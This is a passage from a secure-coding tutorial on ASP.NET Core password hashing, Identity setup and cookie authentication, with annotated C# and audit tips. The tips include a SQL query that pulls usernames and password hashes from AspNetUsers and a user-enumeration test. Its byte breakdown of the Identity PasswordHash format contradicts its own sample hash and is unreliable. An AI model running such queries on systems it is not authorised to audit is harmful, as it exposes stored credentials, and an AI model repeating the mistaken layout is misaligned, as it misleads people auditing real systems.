    private static string DummyHash() => "100000.AAAAAAAAAAAAAAAAAAAAAA==." +
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
}
```

1. `System.Collections.Concurrent` — thread-safe collections. A web server executes many requests *simultaneously*; a plain `Dictionary` mutated by parallel requests corrupts. Concurrency correctness is availability security (CIA's A).
2. `record RegisterRequest(...)` — a **positional record**: an immutable data carrier. Because `[ApiController]` is active, JSON bodies bind to it *automatically*. Note what this implies: a client who sends extra fields (`"role":"admin"`) simply has them ignored — binding only takes what the record declares. (When records grow fat in Chapter 11, that protection is called **mass-assignment defense**.)
3. `RegisteredUser` — the stored user, holding the hash **only**. There is deliberately no `Password` property anywhere in the system.
4. `static ConcurrentDictionary` — our placeholder user store until Chapter 6 gives the MVC app a real database and Chapter 8 gives the API one. The key is `lowercased username`, giving case-insensitive uniqueness ("Ali" == "ali").
5. `Register` binds the JSON body to `request`; no `[FromBody]` needed under `[ApiController]`.
6. `is < 3 or > 32` — C# pattern matching as a range check. Validation-first style: reject before touching anything expensive. Length check *before* hashing: don't let an attacker burn CPU on a 10MB password (yes, PBKDF2 over a huge input is a mini-DoS; that is why real frameworks cap input sizes — Chapter 16 does it for files).
7. Hash **at registration** — the last moment plaintext exists. From here on, the system only ever sees hashes.
8. `TryAdd` — atomic "insert only if free": the *return value* distinguishes success from duplicate — no race between two simultaneous registrations of the same name. `Conflict()` — `409`, the semantically correct "state conflict" answer.
9. `201 Created` — the response contract says "a new resource now exists". Contracts matter: scanners (Chapter 22) and legit clients read status codes as ground truth.
10. `Login` — reuses the same request shape (username+password) but different semantics — see why that's sloppy in [ANALYST LENS] below.
11. `TryGetValue` — fetch by key; `known` records existence *without crashing* on a miss. We do **not** return `404` for unknown users — see line 13.
12. **The subtle line — equal work for everyone.** If we skipped hashing on unknown usernames, a timing difference would reveal *which usernames exist* (user enumeration — a real A07 finding). Instead, we verify against a **DummyHash** — same PBKDF2 cost, result discarded — so both "no such user" and "wrong password" take identical time and return identical responses.
13. `if (!known || !ok) return Unauthorized();` — one single `401` for both failure causes: no information about *which* part failed. (Lazy `||` would skip the second check when the first is true, but line 12 already did the work up front, so timing stays flat.)
14. `Ok(new { message = ... })` — an **anonymous object**; the serializer turns it into JSON. The password check has passed — this response is the moment Chapter 7/8 upgrade into a cookie or a token. (Yes, the DummyHash constant looks silly with its repeated `A`s — a real dummy is a *valid-format* hash of a random secret; format matters because `Verify` parses it.)

> [ANALYST LENS] Three greps you now run against any .NET codebase on day one:
> 1. `grep -rn "MD5\|SHA1" --include=*.cs` — museum-era hashes.
> 2. `grep -rn "new Random(" --include=*.cs` — predictable "randomness" (salts, tokens, reset codes).
> 3. Password/secret-looking columns or fields that are *not* named hash — then check whether they contain base64 of something reversible.
> And one behavior test: register a wrong-password login for a nonexistent user and for an existing user — **if the responses differ in status, message, or time, you found user enumeration.**

### 5.8 Recap

- Store a *slow, salted, versioned* hash — never plaintext, never fast hashes, never encryption, never homebrew.
- Salt: unique per password, random, stored openly — kills rainbow tables and twin-password leaks. Work factor: the cost knob that makes guessing expensive — store it with the hash so you can raise it.
- Use `RandomNumberGenerator`, compare secrets with `CryptographicOperations.FixedTimeEquals`, fail closed, keep failure paths identical (message *and* timing) to stop user enumeration.
- `Rfc2898DeriveBytes.Pbkdf2` is production-grade machinery in one static call; .NET's `PasswordHasher<T>` (next chapter) adds versioning and migration on top.
- Validation order (reject cheap, then hash expensive), atomic uniqueness (`TryAdd`), correct status codes (409/201/401) — small decisions that add up to a professional auth surface.

**Next:** Chapter 6 replaces our hand-forged identity core in the MVC app with **ASP.NET Core Identity** — the platform's full identity system: user store, roles, lockout, two-factor scaffolding — and you will finally understand exactly what it does, because you have just built its innermost 40 lines yourself.
## Chapter 6: ASP.NET Core Identity from Zero

> "Chapter 5 taught you what happens inside the vault. Now install the bank."

### 6.1 What You Will Learn in This Chapter

You will replace SecureShop.Web's hand-rolled auth with **ASP.NET Core Identity** — the platform's complete identity system — and understand *every* piece: the entity model, the database it generates (all seven `AspNet*` tables, column by column), the options that decide password and lockout policy, migrations, and a complete register/login/logout flow written with `UserManager` and `SignInManager`, line by line. We finish inside the `PasswordHasher` output format itself, so that when you audit a real `AspNetUsers` table someday, you will know exactly what you are looking at.

### 6.2 History: Identity's Four Generations

Every generation solved its predecessor's pain:

- **2005 — ASP.NET Membership** (.NET Framework 2.0): the first built-in user store. Problem: schema and behavior were welded to SQL Server and a rigid "application name + provider" model.
- **2011 — SimpleMembership** (WebMatrix / early MVC): flexible schema, easier to use. Problem: yet another mini-framework; no first-class async; the pieces did not compose.
- **2013 — ASP.NET Identity** (OWIN era): users as plain CLR classes you can extend, claims-based identity inside, pluggable stores. This is when .NET identity stopped being "a table" and became "a model".
- **2016 → today — ASP.NET Core Identity**: cross-platform, async end to end, DI-native, EF Core-backed, and integrated with the cookie and JWT authentication you meet in Chapters 7-8. Under constant security review — one more reason to build on it rather than beside it.

### 6.3 What Identity Actually Provides

More than most developers realize — and knowing the list is knowing what you *don't have to build*:

- **User store** — persistence of users (EF Core by default), including a normalized/denormalized lookup schema (we dissect it in § 6.5).
- **Password hashing with format versioning** — PBKDF2 today, upgrade path tomorrow: it re-hashes old-format hashes *silently at successful login* (the mechanism Chapter 5 hinted at, done for you).
- **Lockout** — counting failed attempts and freezing accounts (brute-force control; OWASP A07). You met the concept; Identity ships the machinery.
- **Email confirmation, password reset, two-factor (2FA/TOTP)** — token generation with purpose strings and lifetimes (`AddDefaultTokenProviders`).
- **Roles, claims, and external logins** — Chapters 9-10 build directly on these tables.
- **`UserManager<T>`, `SignInManager<T>`, `RoleManager<T>`** — the services you call; DI hands them to you pre-configured.

> [RULE] Use the platform's identity system unless you have a *written, reviewed* reason not to. Bespoke auth is where A07 findings are born: it is a huge, subtle surface that the framework already engineered against — and it is maintained by people whose full-time job is watching for new attacks against it.

### 6.4 Setup: Packages, Entities, DbContext

In the **Web** project:

```bash
dotnet add src/SecureShop.Web package Microsoft.AspNetCore.Identity.EntityFrameworkCore
dotnet add src/SecureShop.Web package Microsoft.EntityFrameworkCore.Sqlite
dotnet add src/SecureShop.Web package Microsoft.EntityFrameworkCore.Design
```

- **Identity.EntityFrameworkCore** — the EF Core bindings of Identity (user store as tables).
- **EFCore.Sqlite** — the database driver. Our lab uses SQLite *(a complete SQL engine in one file, zero install)* so every reader runs identical commands; production would use `SqlServer`/`PostgreSQL` with the *same* code — only the connection string and driver package change. [ANALYST LENS] driver choice matters for injection testing nuances in Chapter 12, but *parameterization* — the fix — is identical everywhere.
- **EFCore.Design** — design-time support for the migration tool (below).

Create `src/SecureShop.Web/Data/AppUser.cs`:

```csharp
using Microsoft.AspNetCore.Identity;                     // 1

namespace SecureShop.Web.Data;

public class AppUser : IdentityUser                      // 2
{
    public string FullName { get; set; } = string.Empty; // 3
}
```

1. The namespace where all Identity types live.
2. `AppUser : IdentityUser` — inheritance gives us the full standard user: `Id`, `UserName`, `NormalizedUserName`, `Email`, `EmailConfirmed`, `PasswordHash`, `SecurityStamp`, `ConcurrencyStamp`, `TwoFactorEnabled`, `LockoutEnd`, `AccessFailedCount`, `PhoneNumber`, ... — **about twenty security-relevant columns for free** (§ 6.5 explains each). Our class *extends* rather than replaces: EF Core's "table per hierarchy" maps subclass properties as extra columns.
3. One custom property, proving extension is trivial. [ANALYST LENS] When you inherit a user entity, *audit what you add*: custom fields holding secrets (PIN, tax ID) must get the same protection treatment as passwords — they usually don't, and that's the finding.

Create `src/SecureShop.Web/Data/AppDbContext.cs`:

```csharp
using Microsoft.AspNetCore.Identity.EntityFrameworkCore; // 1
using Microsoft.EntityFrameworkCore;
using SecureShop.Core.Models;

namespace SecureShop.Web.Data;

public class AppDbContext : IdentityDbContext<AppUser>  // 2
{
    public AppDbContext(DbContextOptions<AppDbContext> options) : base(options) { }   // 3

    public DbSet<Product> Products => Set<Product>();    // 4
}
```

1. `IdentityDbContext` (with the whole EF Core stack) — this is the base that "knows" the identity schema.
2. `: IdentityDbContext<AppUser>` — by inheriting, our context *is* the identity store: `Users`, `Roles`, `UserClaims`, ... are pre-configured `DbSet`s, typed to `AppUser`. The generic parameter is exactly the hook we used in § 6.4 above.
3. The constructor receives configured options via DI — the standard EF Core pattern; the connection string never appears in code.
4. Finally a real home for products — Chapter 4's `static List<Product>` is about to retire. `=> Set<Product>()` — the expression-bodied way to declare a typed table. One database, one context, one source of truth.

Wire it up in `appsettings.json`:

```json
{
  "ConnectionStrings": {
    "Default": "Data Source=secureshop.db"
  }
}
```

`Data Source=secureshop.db` — SQLite opens (creates if absent) a single file in the app's working directory: your whole database is `secureshop.db`. [DANGER] A database file in the project folder is one `git add .` away from being committed — real-world leak class. Chapter 17 fixes `.gitignore` and secret hygiene; notice the smell now.

### 6.5 Migrations: Version Control for Your Schema

EF Core does not "create tables" magically; it generates **migrations** — C# classes describing schema changes as code (reviewable, revertible, diffable — a *control*, not just plumbing):

```bash
dotnet tool install --global dotnet-ef        # once per machine
dotnet ef migrations add InitialIdentity      # generate migration code
dotnet ef database update                     # apply it to the DB
```

- **`dotnet-ef`** — the EF command-line tool; `--global` installs it for all your projects.
- **`migrations add InitialIdentity`** — compares your model classes to the last known snapshot and *writes the difference as C#* into `Data/Migrations/*_InitialIdentity.cs` (`Up()` applies, `Down()` reverts). Read that file once — you will see `CreateTable(...)` calls, i.e., your schema as code.
- **`database update`** — executes `Up()`. `secureshop.db` now exists with the full schema. (Production adds `migrations bundle` / approval steps — the principle: **schema changes should be reviewed like code, because schema is security posture**.)

Open `secureshop.db` with any SQLite browser (e.g. the "SQLite Viewer" VS Code extension) and meet the seven tables — this *is* the OWASP A07 landscape:

| Table | Purpose | Columns you must understand |
|---|---|---|
| `AspNetUsers` | The users | `Id` (random GUID string — not sequential; see Ch. 11), `UserName`/`NormalizedUserName` (uppercased for case-insensitive lookup), `Email`/`NormalizedEmail` + `EmailConfirmed` (proves address ownership), **`PasswordHash`** (§ 6.7), **`SecurityStamp`** (random string changed on password change/role change — invalidates old cookies & tokens), **`ConcurrencyStamp`** (optimistic-concurrency token — two admins editing the same user can't silently clobber), `TwoFactorEnabled`, `LockoutEnd` (timestamp while frozen), `AccessFailedCount`, + your `FullName` |
| `AspNetRoles` | Named roles ("Admin", "Support") | `Id`, `Name`, `NormalizedName`, `ConcurrencyStamp` |
| `AspNetUserRoles` | Which user has which role (many-to-many) | `UserId`, `RoleId` |
| `AspNetUserClaims` | Claims *(identity facts: "email verified", "employee since 2020")* attached to a user | `UserId`, `ClaimType`, `ClaimValue` |
| `AspNetRoleClaims` | Claims attached to a role | `RoleId`, `ClaimType`, `ClaimValue` |
| `AspNetUserLogins` | External providers (Google/GitHub...) mapped to local users | `LoginProvider`, `ProviderKey`, `UserId` (Ch. 9 uses this) |
| `AspNetUserTokens` | Purpose-scoped tokens (reset codes, 2FA keys) | `UserId`, `LoginProvider`, `Name`, `Value` |

> [ANALYST LENS] Real engagement shortcut: `SELECT UserName, PasswordHash FROM AspNetUsers LIMIT 3` — if hashes start `AQAAAAIA` (§ 6.7), the store is modern; if you find readable passwords or `MD5`-length blobs, stop and write a critical finding before looking at anything else.

### 6.6 Program.cs: Registration and Options, Line by Line

Add to `SecureShop.Web/Program.cs` (after `AddControllersWithViews`):

```csharp
builder.Services.AddDbContext<AppDbContext>(options =>        // 1
    options.UseSqlite(builder.Configuration.GetConnectionString("Default")));

builder.Services.AddIdentity<AppUser, IdentityRole>(options =>  // 2
    {
        options.Password.RequiredLength = 12;                  // 3
        options.Password.RequireDigit = true;
        options.Password.RequireUppercase = true;
        options.Password.RequireLowercase = true;
        options.Password.RequireNonAlphanumeric = false;       // 4
        options.Password.RequiredUniqueChars = 1;
        options.User.RequireUniqueEmail = true;
        options.Lockout.MaxFailedAccessAttempts = 5;            // 5
        options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
        options.SignIn.RequireConfirmedEmail = false;          // 6
    })
    .AddEntityFrameworkStores<AppDbContext>()                  // 7
    .AddDefaultTokenProviders();                                // 8
```

1. `AddDbContext` — registers the EF context into DI, configuring it to read the connection string we set. Every controller can now *ask* for an `AppDbContext` and receive one.
2. `AddIdentity<AppUser, IdentityRole>` — the big registration: registers the user/role stores, `UserManager`, `SignInManager`, the **cookie authentication handler** (Chapter 7's topic, pre-wired with sensible defaults), plus the lockout and token services. The `<AppUser, IdentityRole>` pair fixes the entity types for the whole system.
3. **Password policy.** `RequiredLength = 12` — length is the *primary* strength driver (NIST SP 800-63B: prefer long passwords + screening against breach lists; composition rules alone add little and annoy users into `Winter2024!` patterns).
4. `RequireNonAlphanumeric = false` — deliberately *off*: modern guidance (NIST/DOWN) removes symbol-mandates because users respond with predictable `!` at the end. [ANALYST LENS] Weak settings here (`RequiredLength = 6`, `Lockout.MaxFailedAccessAttempts = 500`?) are the cheapest A07 finding in any .NET codebase — it is a five-line config review.
5. **Lockout** — after 5 failures, freeze for 15 minutes. The brute-force economics control from Chapter 5's theory, now one line. (Chapter 18 adds *rate limiting* on top — they complement: lockout protects accounts, rate limiting protects the server.)
6. `RequireConfirmedEmail = false` — **lab-only convenience.** Production: `true`, forcing registration to prove address control (and giving password-reset somewhere safe to go). Comment it loudly in your code, so your future self doesn't ship the lab to prod.
7. `.AddEntityFrameworkStores<AppDbContext>()` — bind Identity to *our* context: the stores read/write the tables you just inspected.
8. `.AddDefaultTokenProviders()` — the machinery for reset-password emails, email-change confirmations, 2FA codes: tokens are purpose-scoped ("what is this token *for*") and time-limited — the same design lesson as Chapter 5's stored-format string, at framework level.

And one critical insertion in the pipeline (order matters):

```csharp
app.UseAuthentication();       // 9  -- BEFORE UseAuthorization
app.UseAuthorization();
```

9. The **authentication middleware**: on every request, it runs the registered auth handlers (the cookie handler, for now), and if valid credentials are present, populates `HttpContext.User` — the request's identity. Authorization (Chapters 10-11) *reads* that identity; it cannot exist before it. A pipeline with `UseAuthorization` before `UseAuthentication` is a classic real-world misconfiguration — everyone gets `403` or everyone gets through, depending on the framework's fallback kindness. Memorize: **authentication first, authorization second**.

### 6.7 Inside the `PasswordHash` Column

Register one user (next section), then look at the hash:

```text
AQAAAAIAAYagAAAAEA8BN0vXvGw0uBjv0Zkuh2p2F0yZKssHjDPLJM3i4Avq
```

Decode the base64 to bytes and you can read the V3 format (V2 = PBKDF2-SHA1, V3 = PBKDF2-HMAC-SHA256, both still verifiable — *versioned formats* mean an upgraded app still logs in 2015-era users and transparently re-hashes them):

```text
0x00 0x01                        -- version  marker (0x01 = V3)
0x01                             -- format marker
0x01                             -- PRF id: 1 = HMAC-SHA256
0x00 0x01 0x86 0xA0              -- iterations: 100,000  (big-endian)
0x00 0x10                        -- salt size: 16 bytes
0x00 0x20                        -- derived key size: 32 bytes
<16 salt bytes><32 key bytes>
```

Compare with Chapter 5's `"{iterations}.{salt}.{hash}"` string: same information, binary encoding, plus an explicit PRF field so the algorithm itself can evolve. You can now *read* any ASP.NET Core password database in the wild — and you know that a hash failing to start `AQAAAAIA` (base64 of `00 01 01 01`) deserves a second look.

### 6.8 Register, Login, Logout — Line by Line

`src/SecureShop.Web/Models/AccountViewModels.cs`:

```csharp
using System.ComponentModel.DataAnnotations;

namespace SecureShop.Web.Models;

public class RegisterViewModel
{
    [Required, EmailAddress]                                  // 1
    public string Email { get; set; } = string.Empty;

    [Required, StringLength(64, MinimumLength = 1)]
    public string FullName { get; set; } = string.Empty;

    [Required, MinLength(12), DataType(DataType.Password)]     // 2
    public string Password { get; set; } = string.Empty;

    [DataType(DataType.Password), Compare(nameof(Password))]   // 3
    public string ConfirmPassword { get; set; } = string.Empty;
}

public class LoginViewModel
{
    [Required, EmailAddress]
    public string Email { get; set; } = string.Empty;

    [Required, DataType(DataType.Password)]
    public string Password { get; set; } = string.Empty;

    public bool RememberMe { get; set; }                       // 4
    public string? ReturnUrl { get; set; }                     // 5
}
```

1. **Data annotations** — declarative validation: `[Required]` rejects empty, `[EmailAddress]` enforces a *format*. [DANGER] Format validation is UX, not security — `[EmailAddress]` does not prove the mailbox exists or belongs to the submitter; treat annotations as *input hygiene*, never as identity proof.
2. `[MinLength(12)]` — mirrors the policy from `Program.cs`: **two layers** (attribute + options) both validate; MVC binds → validates → fills `ModelState` *before* your action runs.
3. `[Compare]` — the "type it twice" UX check. Note `nameof(Password)` — compile-checked refactoring; typos in magic strings cause silent dead validation.
4. `RememberMe` — maps to `isPersistent` below: persistent vs session cookie (Chapter 7 explains the exact cookie lifetime difference).
5. `ReturnUrl` — "where to go after login". Nullable. [DANGER] A user-controlled redirect target is Chapter 15's **open redirect** — we already treat it correctly here with `LocalRedirect` (line 12 below), and Chapter 15 shows the broken alternative you will someday find in legacy code.

`src/SecureShop.Web/Controllers/AccountController.cs`:

```csharp
using Microsoft.AspNetCore.Identity;                    // 1
using Microsoft.AspNetCore.Mvc;
using SecureShop.Web.Data;
using SecureShop.Web.Models;

namespace SecureShop.Web.Controllers;

public class AccountController : Controller             // 2
{
    private readonly UserManager<AppUser> _userManager;
    private readonly SignInManager<AppUser> _signInManager;

    public AccountController(UserManager<AppUser> userManager,                     // 3
                             SignInManager<AppUser> signInManager)
    {
        _userManager = userManager;
        _signInManager = signInManager;
    }

    [HttpGet]
    public IActionResult Register() => View();         // 4

    [HttpPost]
    [ValidateAntiForgeryToken]                         // 5
    public async Task<IActionResult> Register(RegisterViewModel model)
    {
        if (!ModelState.IsValid) return View(model);   // 6

        var user = new AppUser { UserName = model.Email, Email = model.Email, FullName = model.FullName };

        IdentityResult result = await _userManager.CreateAsync(user, model.Password);   // 7

        if (!result.Succeeded)                          // 8
        {
            foreach (var error in result.Errors)
                ModelState.AddModelError(string.Empty, error.Description);
            return View(model);
        }

        await _signInManager.SignInAsync(user, isPersistent: false);  // 9
        return RedirectToAction(nameof(HomeController.Index), "Home");
    }

    [HttpGet]
    public IActionResult Login(string? returnUrl = null)              // 10
        => View(new LoginViewModel { ReturnUrl = returnUrl });

    [HttpPost]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Login(LoginViewModel model)
    {
        if (!ModelState.IsValid) return View(model);

        var result = await _signInManager.PasswordSignInAsync(       // 11
            model.Email, model.Password,
            isPersistent: model.RememberMe,
            lockoutOnFailure: true);                                  // 12

        if (result.Succeeded)                                         // 13
            return LocalRedirect(string.IsNullOrWhiteSpace(model.ReturnUrl) ? "/" : model.ReturnUrl);

        if (result.IsLockedOut)                                      // 14
            return View("LockedOut");

        ModelState.AddModelError(string.Empty, "Invalid login attempt.");  // 15
        return View(model);
    }

    [HttpPost]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Logout()
    {
        await _signInManager.SignOutAsync();                          // 16
        return RedirectToAction(nameof(HomeController.Index), "Home");
    }
}
```

1. `Microsoft.AspNetCore.Identity` — `UserManager`/`SignInManager` live here.
2. `Controller` (MVC flavor — views allowed), **constructor injection** (§ note 3): notice the class *asks* for its dependencies and stores them in `readonly` fields. The DI container built in § 6.6 supplies them; no `new UserManager(...)` anywhere — which is exactly why the policy you configured centrally applies everywhere, silently.
3. —
4. `GET Register` returns the empty form view. GET renders; POST mutates — the Chapter 2 verb discipline, kept sacred by the `[HttpGet]`/`[HttpPost]` pair.
5. `[ValidateAntiForgeryToken]` — MVC's CSRF shield: every POST must carry the per-session token the form automatically embedded. The full anatomy (how the token is generated, why it works, what happens when a dev removes it) is Chapter 14 — for now: **every state-changing POST in MVC gets this attribute, no exceptions**.
6. `ModelState.IsValid` — false if any annotation failed; re-render the form with errors. Never `return BadRequest` to a browser form (browsers can't act on JSON error contracts gracefully).
7. `CreateAsync(user, password)` — the identity pipeline in one call: normalizes username/email, validates password against § 6.6 policy, hashes it via `PasswordHasher<AppUser>`, stamps security/concurrency stamps, writes the row. Notice the *action never sees a hash* — the same discipline as Chapter 5, delegated.
8. Errors go back through `ModelState` — surfaced in the view's `<div asp-validation-summary>`. [ANALYST LENS] Read Identity error messages with an attacker's eye: "User already exists" (via a duplicate-email `CreateAsync` failure) is *legitimate* information at registration — but the *login* flow must never reveal it (line 15's generic message is correct).
9. `SignInAsync` — issues the authentication cookie (next chapter dissects exactly what this writes). `isPersistent: false` — session cookie: dies when the browser closes.
10. `Login GET` accepts an optional `returnUrl` in the query string (MVC binds it automatically) so `[Authorize]` (Chapter 7) can bounce visitors here with their intended destination attached.
11. `PasswordSignInAsync` — the *other* half of identity: find user → check lockout state → verify password against the stored hash (constant-time comparison built in) → check confirmation → on success, sign in (cookie). All the Chapter 5 mechanics, industrialized.
12. `lockoutOnFailure: true` — increment `AccessFailedCount` on failure; on the 5th, set `LockoutEnd` 15 minutes out. [DANGER] Passing `false` here (sometimes done to "reduce user friction") silently switches off the entire lockout control you configured — check this argument in every codebase you review.
13. On success: `LocalRedirect` — **only local URLs** (`/...`, `~/...`); throws on absolute/protocol-switching URLs, killing open redirects structurally. Compare-and-contrast with Chapter 15, where we show the vulnerable `Redirect(...)` nobody should write.
14. `IsLockedOut` — explicit branch: show a "locked" page rather than a generic error; the user deserves to know why they're locked out (and you deserve to log it — Chapter 19).
15. The generic failure message — identical for "no such user" and "wrong password": no user enumeration (Chapter 5's rule, kept).
16. `SignOutAsync` — deletes the authentication cookie (Chapter 7 shows the exact `Set-Cookie` doing the deletion).

The `Register.cshtml` view (create `Views/Account/Register.cshtml`; `Login.cshtml` mirrors it):

```html
@model SecureShop.Web.Models.RegisterViewModel
<h2>Create your account</h2>

<form method="post" asp-controller="Account" asp-action="Register">   <!-- 1 -->
    <div asp-validation-summary="All" class="text-danger"></div>       <!-- 2 -->

    <label asp-for="Email"></label>
    <input asp-for="Email" class="form-control" />                     <!-- 3 -->
    <span asp-validation-for="Email" class="text-danger"></span>       <!-- 4 -->

    <label asp-for="FullName"></label>
    <input asp-for="FullName" class="form-control" />

    <label asp-for="Password"></label>
    <input asp-for="Password" class="form-control" />

    <label asp-for="ConfirmPassword"></label>
    <input asp-for="ConfirmPassword" class="form-control" />

    <button type="submit" class="btn btn-primary">Register</button>
</form>

@section Scripts {
    <partial name="_ValidationScriptsPartial" />                       <!-- 5 -->
}
```

1. Tag helpers (`asp-controller`, `asp-action`) build the POST URL; the form tag helper **silently injects the antiforgery token** as a hidden input — CSRF protection is opt-*out* in modern MVC, but verify: `<form method="post">` rendered HTML must contain `__RequestVerificationToken`.
2. `asp-validation-summary="All"` — where `ModelState` errors (§ note 8 above) appear.
3. `asp-for` binds input to the property: `id`/`name` match the C# property, so model binding round-trips correctly.
4. Per-field error slot — filled by the annotation validators and server errors.
5. Loads unobtrusive client validation (`jquery.validate`) — instant feedback. Remember Chapter 2's law: client-side validation is *comfort*; the server re-validates everything (`ModelState.IsValid`) — attackers skip the client entirely.

> [LAB] Full loop, now: run the MVC app → `/Account/Register` → register `admin@secureshop.test` with a 12+ character password → inspect `AspNetUsers` in the SQLite file (see § 6.7's `AQAAAAIA` prefix on your own hash) → F12 → Application → Cookies: **`.AspNetCore.Cookies` has appeared** → log out and watch the cookie get deleted. You have a working, hash-backed, lockout-protected, CSRF-shielded identity system — and you can name every byte involved.

### 6.9 Recap

- Identity = user store + versioned password hashing + lockout + confirmation tokens + 2FA scaffolding + roles/claims + managers, on EF Core. Configure, don't rebuild.
- `AppUser : IdentityUser`, `AppDbContext : IdentityDbContext<AppUser>`, `AddIdentity<AppUser, IdentityRole>()` — three extension points, all reviewed.
- Migrations are schema-as-reviewable-code; the seven `AspNet*` tables are the A07 landscape; you can now read `PasswordHash`'s binary format and `SecurityStamp`'s purpose.
- Pipeline order: `UseAuthentication()` → `UseAuthorization()`. Password policy favors length; lockout must be on (`lockoutOnFailure: true`); login errors are generic; `LocalRedirect` for return URLs; `[ValidateAntiForgeryToken]` on every POST.
- Annotations are hygiene, not security; client validation is comfort, not a boundary.

**Next:** Chapter 7 tears open that `.AspNetCore.Cookies` cookie: what's inside, how Data Protection encrypts it, what every `ConfigureApplicationCookie` option means, and how `[Authorize]` actually decides.
## Chapter 7: Cookie Authentication in MVC

> "The cookie is a passport your server issued. Make it a good one."

### 7.1 What You Will Learn in This Chapter

Chapter 6 left you with a mysterious cookie named `.AspNetCore.Cookies`. This chapter dissects it completely: its history, its exact contents, the request-by-request life of a login, every option of `ConfigureApplicationCookie` (with the attacks each option blocks), and how `[Authorize]` enforces login in MVC. When you finish, "just make sure the cookie is secure" stops being a slogan and becomes a checklist you can grep.

### 7.2 History: From Sticky Notes to Encrypted Tickets

- **1994 — Netscape invents cookies** (Chapter 2): the web gains memory. For the next decade, most servers stored a *session ID* server-side and a bare, unprotected `sessionid=8437` in the browser. Steal the value ⇒ become the user; no cryptographic relationship to anything.
- **2002 — Forms Authentication (ASP.NET 1.0):** the server stops being a dumb store and ships an *encrypted, tamper-proofed ticket*: username, issue time, expiry, all sealed with machine keys. Progress — but a fixed-format ticket, awkward to customize, and encrypted with keys (`machineKey`) that admins notoriously copied from blog posts.
- **2013-2014 — OWIN/Katana cookie middleware:** authentication becomes *middleware* — pluggable into any pipeline — and identities become **claims-based** (Chapter 10 opens this fully).
- **2016+ — ASP.NET Core cookie authentication:** the matured form you use today: a claims-based principal, serialized and protected by the **Data Protection API** (Chapter 17) with automatically rotated local keys. That is what `.AspNetCore.Cookies` is: **your user's identity, encrypted and signed, carried by the user's own browser, verified on every request.**

The deep idea hiding in this history: identity moved from "a row in a server-side table, addressed by a leaky ID" to "a self-protecting ticket". That trade — *server state vs. client-carried credential* — reappears at API scale in Chapter 8, and knowing both sides is what makes the JWT debate (§ 8.10) understandable rather than tribal.

### 7.3 What Is Actually Inside the Cookie

Log in to SecureShop, then DevTools → Application → Cookies → select the value of `.AspNetCore.Cookies`. You will see a long blob like:

```text
CfDJ8FOdC6LZt1hBqzG5rE...MiOq6wA
```

That is **not** base64 of a readable string (try pasting it into a decoder — garbage). It is the output of the Data Protection API: the serialized **`ClaimsPrincipal`** *(the framework's object meaning "this authenticated user, described as a bag of claims" — identity as data)*, then **encrypted (AES-256-CBC) and HMAC-signed** so that:

1. **Nobody can read it** — you cannot extract the username, role, or expiry by decoding; confidentiality against the user themselves and anyone between.
2. **Nobody can forge it** — modifying a byte breaks the signature; the server rejects it. You cannot "upgrade" yourself to admin by editing your own cookie.
3. **The keys never leave the server** — encryption/signing keys live in the server's key ring (Chapter 17 explains where, and why multi-server deployments need shared key config — a top-tier production finding when missed).

Because the payload can exceed the 4 KB cookie limit, ASP.NET Core splits it into **chunks** (`.AspNetCore.Cookies.C1`, `.C2`...). You now know why sometimes you see numbered cookies — not a hack, a size workaround.

### 7.4 The Life of a Login, Request by Request

With the Network tab open, click "Login" and watch five HTTP conversations:

1. `GET /Account/Login` → server renders the form (plus a `Set-Cookie` for the **antiforgery token**, distinct from the auth cookie — Chapter 14).
2. `POST /Account/Login` → on success, the response includes:

```http
HTTP/1.1 302 Found
Set-Cookie: .AspNetCore.Cookies=CfDJ8...; expires=...; path=/; secure; httponly; samesite=Lax
Location: /
```

That single `Set-Cookie` *is* the login. No token in a database row, nothing in localStorage — identity, sealed, handed to the browser.
3. `GET /` — browser automatically attaches `Cookie: .AspNetCore.Cookies=CfDJ8...` (Chapter 2's law in action).
4. Server middleware: **decrypt → verify signature → check expiry → rebuild `ClaimsPrincipal` → attach to `HttpContext.User`**. Your controller reads `User` as if the user had always been there.
5. `POST /Account/Logout` → response `Set-Cookie` with the same name and `expires=` in the past — the browser's own rules delete it.

> [ATTACK] Pause on step 4: the server trusts the cookie *entirely because of cryptography*, not because it remembers you. Whichever machine gets that value **is** you. Every cookie defense below is about making that value unreadable, unstealable, or single-origin.

### 7.5 `ConfigureApplicationCookie`, Line by Line

Add this after `AddIdentity` in the Web `Program.cs` — every line maps to a named attack:

```csharp
builder.Services.ConfigureApplicationCookie(options =>
{
    options.Cookie.Name = "SecureShop.Auth";                      // 1
    options.Cookie.HttpOnly = true;                               // 2
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;     // 3
    options.Cookie.SameSite = SameSiteMode.Lax;                  // 4
    options.Cookie.IsEssential = true;                            // 5
    options.ExpireTimeSpan = TimeSpan.FromHours(2);               // 6
    options.SlidingExpiration = true;                             // 7
    options.LoginPath = "/Account/Login";                         // 8
    options.AccessDeniedPath = "/Account/AccessDenied";           // 9
    options.Events.OnRedirectToLogin = ctx =>                     // 10
    {
        if (ctx.Request.Path.StartsWithSegments("/api"))
        {
            ctx.Response.StatusCode = 401;                        // 10a
            return Task.CompletedTask;
        }
        ctx.Response.Redirect(ctx.RedirectUri);                   // 10b
        return Task.CompletedTask;
    };
});
```

1. `Name` — a custom cookie name. Small **hardening-through-obscurity** value (scanners look for the default name), but real value in knowing *what* to audit on the wire. `SecureShop.Auth` shouts its role — good for reviews.
2. `HttpOnly = true` — the browser must **never** expose the value to JavaScript (`document.cookie` will not list it). Kills the most common XSS token-stealing payload dead (Chapter 13 runs the steal attempt against this wall). [RULE] Any cookie that authorizes actions gets `HttpOnly`. Exceptions (you need JS to read something) are usually design mistakes.
3. `SecurePolicy.Always` — send only over HTTPS, always — even in local tests where you might otherwise accept a downgrade. Pairs with `UseHsts`/`UseHttpsRedirection` (Chapters 4, 17). Without it, a coffee-shop attacker can trick the browser into replaying the cookie over plain HTTP and read it off the wire.
4. `SameSite = Lax` — the browser refuses to attach the cookie to *cross-site* subrequests (a `<img>` or a form POST submitted from another site), with an exception for top-level navigations (GET). This is a **structural CSRF mitigation** — Chapter 14 demonstrates it. `Strict` is even tighter but breaks ordinary link-following UX; `Lax` is the industry default. `None` (needed only for legitimate cross-site embedding) requires `Secure` and must be justified in writing — [ANALYST LENS] `SameSite=None` without a documented reason is a finding.
5. `IsEssential` — participates even under the EU-consent middleware; an auth cookie is by definition essential (no tracking flavor), so declare it.
